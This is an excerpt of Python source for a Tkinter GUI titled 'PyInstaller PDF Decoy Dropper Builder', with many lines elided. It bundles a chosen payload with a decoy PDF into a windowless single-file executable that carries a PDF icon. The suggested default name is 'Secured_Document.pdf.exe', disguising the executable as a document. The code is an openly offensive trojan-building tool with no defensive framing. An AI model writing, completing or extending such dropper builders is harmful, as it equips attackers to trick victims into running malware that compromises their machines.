...
def build_dropper(payload_path, decoy_path, output_name, output_dir, notify_widget=None):
    ...
    if not os.path.isfile(decoy_path):
        raise FileNotFoundError(f"[!] Decoy PDF not found at: {decoy_path}")
    ...
    try:
        ...
        icon_path = os.path.join(os.getcwd(), "pdf.ico")  # Look for pdf.ico in current directory
        
        # Check if pdf.ico exists
        if not os.path.isfile(icon_path):
            raise FileNotFoundError(f"[!] Icon file 'pdf.ico' not found in current directory")
        ...
        shutil.copy2(icon_path, os.path.join(temp_dir, "app_icon.ico"))  # Copy icon to temp dir
        ...
        pyinstaller_cmd = [
            ...
            "--onefile",
            "--windowed", 
            f"--icon={os.path.join(temp_dir, 'app_icon.ico')}",
...
class DropperGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("PyInstaller PDF Decoy Dropper Builder")
    ...
    def create_widgets(self):
        # Title
        title_label = ttk.Label(self.main_frame, text="PyInstaller PDF Decoy Dropper Builder", font=('Consolas', 16, 'bold'), foreground='#22C55E')
        ...
        # 2. Decoy PDF Path
        self.add_file_selector(input_frame, "Decoy PDF Path:", "decoy_path_var", self.select_decoy_file, filetypes=[("PDF files", "*.pdf")])

        # 3. Final Output Name
        self.output_name_entry = self.add_label_entry(input_frame, "Output Name (e.g., Report.pdf.exe):", "output_name_var", "Secured_Document.pdf.exe")
        
        # 4. Output Directory
        self.add_file_selector(input_frame, "Output Directory:", "output_dir_var", self.select_output_directory, is_directory=True)

        # Generate Button
        self.build_button = ttk.Button(self.main_frame, text="BUILD PDF DECOY DROPPER (.exe)", command=self.start_build_thread)
    ...
    def start_build_thread(self):
        ...
        # Check for pdf.ico
        if not os.path.isfile(os.path.join(os.getcwd(), "pdf.ico")):
            messagebox.showerror("Missing Icon", "Please place a 'pdf.ico' file in the current directory.")
            return
    ...
    def run_build(self, payload_path, decoy_path, output_name, output_dir):
        ...
        try:
            ...
            self.after(0, self.build_button.config, 
                       {'state': tk.NORMAL, 'text': "BUILD PDF DECOY DROPPER (.exe)"})
